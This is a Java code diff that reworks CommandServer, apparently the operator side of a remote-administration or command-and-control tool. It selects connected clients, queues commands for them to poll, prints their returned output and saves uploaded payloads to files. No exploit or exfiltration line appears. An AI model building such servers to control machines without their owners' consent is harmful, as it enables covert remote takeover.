@@ -2,12 +2,11 @@ package server;
 
 import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.OutputStream;
-import java.net.Socket;
 import java.util.HashMap;
 
 import tools.Command;
+import tools.Connection;
 import tools.Log;
 import tools.ParsedCommand;
 
@@ -29,6 +28,7 @@ public class CommandServer implements RequestHandler, CommandHandler {
 	// The set of connected clients IPs
 	private ClientPool clients;
 	private int currentClient = -1;
+	private boolean clientConnected = false;
 	
 	// Log requests
 	private Log log;
@@ -124,6 +124,7 @@ public class CommandServer implements RequestHandler, CommandHandler {
 
 			@Override
 			public String exec(ParsedCommand pCmd) {
+				clients.get(currentClient).stackCmd("DONE");
 				currentClient = -1;
 				return "Client unselected.";
 			}
@@ -189,6 +190,18 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		
 		// ***** CLIENT REQUESTS COMMANDS ***** //
 		
+		// Close connection
+		cmdsClient.put("DONE", new Command() {
+
+			@Override
+			public String exec(ParsedCommand pCmd) {
+				if (currentClient >= 0)
+					return "N_DONE";
+				return "DONE";
+			}
+			
+		});
+		
 		// Assign an ID to a client
 		cmdsClient.put("GETID", new Command(){
 			
@@ -224,7 +237,13 @@ public class CommandServer implements RequestHandler, CommandHandler {
 						&& client.hasCmd()) {
 					return client.popCmd();
 				}
-				return "PONG";
+				if (currentClient >= 0) {
+					clientConnected = true;
+					System.out.print("\nClient " + currentClient
+							+ " connected.\n" + getPrefix() + ">");
+					return "N_DONE";
+				}
+				return "DONE";
 			}
 			
 		});
@@ -238,7 +257,8 @@ public class CommandServer implements RequestHandler, CommandHandler {
 				for (int i = 0; i < pCmd.payload.length; i++)
 					System.out.print((char) pCmd.payload[i]);
 				System.out.print(getPrefix() + ">");
-
+				if (currentClient >= 0)
+					return "N_DONE";
 				return "DONE";
 			}
 			
@@ -259,7 +279,8 @@ public class CommandServer implements RequestHandler, CommandHandler {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
 				}
-				
+				if (currentClient >= 0)
+					return "N_DONE";
 				return "DONE";
 			}
 			
@@ -268,52 +289,43 @@ public class CommandServer implements RequestHandler, CommandHandler {
 	}
 
 	@Override
-	public void handle(Socket socket)
+	public void handle(Connection conn)
 			throws IOException {
-		
-		// Opening in/out streams
-		InputStream in = socket.getInputStream();
-		OutputStream out = socket.getOutputStream();
-		
-		// Payload length
-		StringBuilder sb = new StringBuilder();
-		int c;
-		while ((c = in.read()) != 10) {
-			if (c != 10 && c != 13)
-				sb.append((char) c);
-		}
-		int payloadLength = Integer.parseInt(sb.toString());
-		byte[] payload = new byte[payloadLength];
-		
-		// Reading request
-		sb = new StringBuilder();
-		while ((c = in.read()) != 10) {
-			if (c != 10 && c != 13)
-				sb.append((char) c);
-		}
-		String request = sb.toString();
-		
-		// Reading payload
-		for (int i = 0; i < payloadLength; i++) {
-			payload[i] = (byte) in.read();
-		}
-		
-		// Logging request
-		log.add(0, socket.getInetAddress() + "\t" + request);
-		
-		// Executing command
-		ParsedCommand pCmd = new ParsedCommand(request, payload);
-		if (cmdsClient.containsKey(pCmd.cmd)) {
-			String response = cmdsClient.get(pCmd.cmd).exec(pCmd);
-			log.add(1, socket.getInetAddress() + "\t" + response);
-			out.write(response.getBytes());
-			out.flush();
-		}
-		
-		// Closing all streams
-		out.close();
-		in.close();
+				
+		String response = null;
+		while (response == null || !response.startsWith("DONE")) {
+			
+			ParsedCommand pCmd = conn.readRequest();
+			
+			// Logging request
+			log.add(0, conn.getInetAddress() + "\t"
+					+ pCmd.cmd + "\t" + pCmd.argLine());
+			
+			// Executing command
+			if (cmdsClient.containsKey(pCmd.cmd)) {
+				response = cmdsClient.get(pCmd.cmd).exec(pCmd);
+				log.add(1, conn.getInetAddress() + "\t" + response);
+				conn.write(response);
+			}
+			
+			if (response != null && response.startsWith("N_DONE")) {
+				ConnectedClient client = clients.get(currentClient);
+				while (!client.hasCmd())
+					try {
+						Thread.sleep(50);
+					} catch (InterruptedException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+				response = client.popCmd();
+				log.add(1, conn.getInetAddress() + "\t" + response);
+				conn.write(response);
+			}
 
+		}
+		
+		clientConnected = false;
+		
 	}
 
 	@Override
@@ -326,8 +338,12 @@ public class CommandServer implements RequestHandler, CommandHandler {
 
 	@Override
 	public String getPrefix() {
-		if (currentClient >= 0) return Integer.toString(currentClient);
-		return "";
+		StringBuilder prefix = new StringBuilder();
+		if (currentClient >= 0)
+			prefix.append(currentClient);
+		if (currentClient >= 0 && !clientConnected)
+			prefix.append("*");
+		return prefix.toString();
 	}
 	
 	public int getCurrentClient() {
